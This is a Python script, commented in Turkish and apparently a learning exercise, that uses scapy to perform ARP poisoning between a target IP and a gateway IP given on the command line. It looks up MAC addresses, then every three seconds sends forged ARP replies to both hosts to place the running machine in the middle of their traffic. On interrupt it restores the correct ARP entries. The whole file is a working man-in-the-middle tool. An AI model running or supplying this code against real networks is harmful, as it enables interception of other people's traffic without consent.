import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]      # 0, sadece answered list'i almamızı sağlıyor. Netscanner'da unanswered list'de vardı o yüzden kullanmadık.

    return answered_list[0][1].hwsrc  # 0 1 listedeki mac, arp, ip gibi şeylerin arasından filtrelemeye yarıyo mac adreslerini böyle filtreledik. .hwsrc hangi mac'i almak istiyosak onu seçtik.

def arp_poisoning(target_ip,poisoned_ip):           # Birisi hedef ip diğeri modem ip. Hem modeme target ip hem de target ip'e modem olduğumuzu söylediğimiz için bu işlemi yapıyoruz.

    target_mac = get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)  # op 1 arp request, 2 arp response demek.
    scapy.send(arp_response,verbose=False)       # verbose komutu, programı çalıştırdığımızda gönderilen alınan paketleri yani gereksiz bilgileri terminalde göstermemeyi sağlar.
    #scapy.ls(scapy.ARP())

def reset_operation(fooled_ip,gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

def get_user_input():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    options = parse_object.parse_args()[0]         # Normalde options ve arguemants ikilisi olur ama bize sadece options gerekli olduğu için sonuna [0] ekledik.

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

number = 0

user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:

        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)

        number += 2

        print("\rSending packets " + str(number),end="")  #Sending packet 2,4,6 şeklinde güncellemeye yarıyor. Çünkü her yollamada 2 paket yolluyoruz. \r aynı satırda kal demek.

        time.sleep(3)
except KeyboardInterrupt:                #KeyboardInterrupt hatasına özel işlem.
    print("\nQuit & Reset")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)